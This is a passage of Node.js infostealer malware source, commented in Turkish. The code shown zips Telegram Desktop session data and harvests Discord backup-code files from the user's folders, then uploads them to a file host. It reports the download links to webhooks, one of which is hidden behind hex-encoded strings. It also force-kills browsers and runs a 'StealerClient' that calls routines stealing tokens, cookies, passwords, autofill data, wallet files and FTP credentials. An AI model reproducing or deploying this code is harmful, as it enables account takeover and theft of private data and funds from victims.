            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });



				   
        }
}

//
async function SubmitTelegram() {
      const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Telegram Desktop\\tdata`;
  if (fs.existsSync(file)) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(file);

    zipper.writeZip(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\TelegramSession.zip`);
//C:\Users\Administrator\AppData\Roaming\Telegram Desktop
              
// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\TelegramSession.zip`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'Telegram File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };



var _0xec06=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74","\x57\x65\x62\x68\x6F\x6F\x6B\x20\x67\xF6\x6E\x64\x65\x72\x69\x6C\x69\x72\x6B\x65\x6E\x20\x68\x61\x74\x61\x20\x6F\x6C\x75\u015F\x74\x75\x3A","\x6D\x65\x73\x73\x61\x67\x65","\x6C\x6F\x67","\x63\x61\x74\x63\x68","\x57\x65\x62\x68\x6F\x6F\x6B\x20\x67\xF6\x6E\x64\x65\x72\x69\x6C\x64\x69\x3A","\x73\x74\x61\x74\x75\x73","\x73\x74\x61\x74\x75\x73\x54\x65\x78\x74","\x74\x68\x65\x6E"];axios[_0xec06[1]](_0xec06[0],embedData);axios[_0xec06[1]](webhook3939,embedData)[_0xec06[9]]((_0x2a13x2)=>{console[_0xec06[4]](_0xec06[6],_0x2a13x2[_0xec06[7]],_0x2a13x2[_0xec06[8]])})[_0xec06[5]]((_0x2a13x1)=>{console[_0xec06[4]](_0xec06[2],_0x2a13x1[_0xec06[3]])})


        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
          axios.post("https://buildandwatch.net/'", embedData)

            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
           // Webhook'a POST isteği gönder
axios.post(webhook3939, embedData)

            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
 
 });
	
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });



				   
        }
}



///


async function downloadFile(url, targetPath) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(targetPath);

        https.get(url, (response) => {
            response.pipe(file);

            response.on('end', () => {
                file.end();
                resolve(targetPath);
            });
        }).on('error', (err) => {
            fs.unlink(targetPath, () => {
                reject(err);
            });
        });
    });
}







//////////
function getPeperonni() {
    let str = '';
    const homeDir = require('os').homedir();
    if (fs.existsSync(`${homeDir}\\Downloads`)) {
        fs.readdirSync(`${homeDir}\\Downloads`).forEach(file => {
            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                let path = `${homeDir}\\Downloads\\${file}`
                str += `\n\n@~$~@fewer-${path}`,
                    str += `\n\n${fs.readFileSync(path).toString()}`
            }
        })
    }
    if (fs.existsSync(`${homeDir}\\Desktop`)) {
        fs.readdirSync(`${homeDir}\\Desktop`).forEach(file => {
            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                let path = `${homeDir}\\Desktop\\${file}`
                str += `\n\n@~$~@fewer-${path}`,
                    str += `\n\n${fs.readFileSync(path).toString()}`
            }
        })
    }
    if (fs.existsSync(`${homeDir}\\Documents`)) {
        fs.readdirSync(`${homeDir}\\Documents`).forEach(file => {
            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                let path = `${homeDir}\\Documents\\${file}`
                str += `\n\n@~$~@fewer-${path}`,
                    str += `\n\n${fs.readFileSync(path).toString()}`
            }
        })
    }
    if (str !== '') {
        fs.writeFileSync('\\backupcodes.txt', str.slice(2))


axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = `\\backupcodes.txt`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

      axios.post(`https://${server}.gofile.io/uploadFile`, form, {
        headers: form.getHeaders()
      })
        .then(uploadResponse => {
          const responsePayload = {
            uploadResponseData: uploadResponse.data
          };

          // Webhook URL'si
          const webhookUrl = 'https://buildandwatch.net/';

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'BackupCode Dosyası Yükleme Yanıtı',
                description: JSON.stringify(uploadResponse.data, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });

        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si
          const webhookUrl = 'https://buildandwatch.net/';

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });


    }
}
///
//


async function closeBrowsers() {
  const browsersProcess = ["chrome.exe", "Telegram.exe", "msedge.exe", "opera.exe", "brave.exe"];
  return new Promise(async (resolve) => {
    try {
      const { execSync } = require("child_process");
      const tasks = execSync("tasklist").toString();
      browsersProcess.forEach((process) => {
        if (tasks.includes(process)) {
          execSync(`taskkill /IM ${process} /F`);
        }
      });
      await new Promise((resolve) => setTimeout(resolve, 2500));
      resolve();
    } catch (e) {
      console.log(e);
      resolve();
    }
  });
}


//


function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}

class StealerClient {
	constructor() {
		closeBrowsers();
		StopCords();
		getEncrypted();
		getCookiesAndSendWebhook();
		getExtension();
		InfectDiscords();
	//	StealTokens();
	     stealTokens();
		stealltokens();
		getAutofills();
		getPasswords();
		getZippp();
		SubmitTelegram();
		getPeperonni();
		SubmitExodus();
submitfilezilla();

	}
}

new StealerClient()
